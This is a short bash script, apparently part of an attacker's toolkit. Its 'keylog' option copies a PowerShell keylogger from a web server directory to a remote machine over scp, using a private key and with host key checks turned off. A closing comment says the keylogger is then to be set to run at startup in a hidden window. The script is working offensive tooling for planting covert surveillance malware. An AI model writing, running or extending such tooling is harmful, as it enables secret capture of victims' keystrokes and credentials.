#!/bin/bash
case ${1} in
keylog) scp -q -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /var/www/html/id_rsa.txt -P ${4} /var/www/html/keylogger.ps1 ${2}@${3}:/Users/Public/Downloads

  ;;
esac
# then needs to be set to run on startup in a closed window
